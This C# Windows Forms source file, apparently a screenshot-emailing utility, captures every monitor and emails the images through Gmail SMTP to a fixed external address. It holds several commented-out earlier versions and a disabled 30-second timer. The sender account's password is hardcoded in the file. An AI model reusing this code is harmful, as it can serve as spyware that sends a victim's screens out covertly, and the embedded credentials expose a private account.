using System.Net;
using System.Net.Mail;

namespace AutomatedScreenshotEmailer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            TakeScreenshotAndSendEmail(null);
            //System.Threading.Timer timer = new System.Threading.Timer(TakeScreenshotAndSendEmail, null, TimeSpan.Zero, TimeSpan.FromSeconds(30));
        }

        //private void TakeScreenshotAndSendEmail(object state)
        //{
        //    try
        //    {
        //        Rectangle bounds = new Rectangle(100, 100, 500, 500); // replace with the coordinates and size of the area you want to capture
        //        Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);
        //        using (Graphics graphics = Graphics.FromImage(screenshot))
        //        {
        //            graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
        //        }

        //        using (MailMessage message = new MailMessage())
        //        {
        //            message.From = new MailAddress("n0r3ply.system.generated@gmail.com");
        //            message.To.Add(new MailAddress("jazmark2215@gmail.com"));
        //            message.Subject = "Screenshot";
        //            message.Body = "Please find the attached screenshot.";
        //            using (MemoryStream stream = new MemoryStream())
        //            {
        //                screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
        //                stream.Position = 0;
        //                message.Attachments.Add(new Attachment(stream, "screenshot.png", "image/png"));
        //                using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587))
        //                {
        //                    smtpClient.Credentials = new NetworkCredential("n0r3ply.system.generated@gmail.com", "vxpiknnlpbsxrfgh");
        //                    smtpClient.EnableSsl = true;
        //                    smtpClient.Send(message);
        //                }
        //            }
        //        }
        //    }
        //    catch (Exception ex)
        //    {
        //        Console.WriteLine($"Failed to take screenshot and send email: {ex.Message}");
        //    }
        //}

        //static void TakeScreenshotAndSendEmail(object state)
        //{
        //    try
        //    {
        //        Rectangle bounds;
        //        if (Screen.AllScreens.Length == 1)
        //        {
        //            bounds = Screen.PrimaryScreen.Bounds;
        //        }
        //        else
        //        {
        //            bounds = Rectangle.Empty;
        //            foreach (Screen screen in Screen.AllScreens)
        //            {
        //                bounds = Rectangle.Union(bounds, screen.Bounds);
        //            }
        //        }

        //        Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);
        //        using (Graphics graphics = Graphics.FromImage(screenshot))
        //        {
        //            graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
        //        }

        //        using (MailMessage message = new MailMessage())
        //        {
        //            message.From = new MailAddress("n0r3ply.system.generated@gmail.com");
        //            message.To.Add(new MailAddress("jazmark2215@gmail.com"));
        //            message.Subject = "Screenshot";
        //            message.Body = "Please find the attached screenshot.";
        //            using (MemoryStream stream = new MemoryStream())
        //            {
        //                screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
        //                stream.Position = 0;
        //                message.Attachments.Add(new Attachment(stream, "screenshot.png", "image/png"));
        //                using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587))
        //                {
        //                    smtpClient.Credentials = new NetworkCredential("n0r3ply.system.generated@gmail.com", "vxpiknnlpbsxrfgh");
        //                    smtpClient.EnableSsl = true;
        //                    smtpClient.Send(message);
        //                }
        //            }
        //        }
        //    }
        //    catch (Exception ex)
        //    {
        //        Console.WriteLine($"Failed to take screenshot and send email: {ex.Message}");
        //    }
        //}

        //static void TakeScreenshotAndSendEmail(object state)
        //{
        //    try
        //    {
        //        using (MailMessage message = new MailMessage())
        //        {
        //            message.From = new MailAddress("n0r3ply.system.generated@gmail.com");
        //            message.To.Add(new MailAddress("jazmark2215@gmail.com"));
        //            message.Subject = "Screenshot";
        //            message.Body = "Please find the attached screenshot.";
        //            foreach (Screen screen in Screen.AllScreens)
        //            {
        //                using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
        //                {
        //                    using (Graphics graphics = Graphics.FromImage(screenshot))
        //                {
        //                    graphics.CopyFromScreen(new Point(screen.Bounds.Left, screen.Bounds.Top), Point.Empty, screen.Bounds.Size);
        //                }

        //                using (MemoryStream stream = new MemoryStream())
        //                {
        //                    screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
        //                    stream.Position = 0;
        //                    message.Attachments.Add(new Attachment(stream, $"screenshot_{screen.DeviceName}.png", "image/png"));
        //                    using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587))
        //                    {
        //                        smtpClient.Credentials = new NetworkCredential("n0r3ply.system.generated@gmail.com", "vxpiknnlpbsxrfgh");
        //                        smtpClient.EnableSsl = true;
        //                        smtpClient.Send(message);
        //                    }
        //                }
        //            }

        //        }
        //    }
        //    catch (Exception ex)
        //    {
        //        Console.WriteLine($"Failed to take screenshots and send email: {ex.Message}");
        //    }
        //}

        static void TakeScreenshotAndSendEmail(object state)
        {
            try
            {
                using (MailMessage message = new MailMessage())
                {
                    message.From = new MailAddress("n0r3ply.system.generated@gmail.com");
                    message.To.Add(new MailAddress("jazmark2215@gmail.com"));
                    message.Subject = "Screenshot";
                    message.Body = "Please find the attached screenshot.";

                    foreach (Screen screen in Screen.AllScreens)
                    {
                        using Bitmap screenshot = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
                        using Graphics graphics = Graphics.FromImage(screenshot);

                        graphics.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, 0, 0, screen.Bounds.Size, CopyPixelOperation.SourceCopy);

                        MemoryStream stream = new MemoryStream();

                        screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
                        stream.Position = 0;
                        message.Attachments.Add(new Attachment(stream, "screenshot.png", "image/png"));
                    }

                    using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587))
                    {
                        smtpClient.Credentials = new NetworkCredential("n0r3ply.system.generated@gmail.com", "vxpiknnlpbsxrfgh");
                        smtpClient.EnableSsl = true;
                        smtpClient.Send(message);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to take screenshot and send email: {ex.Message}");
            }
        }




    }
}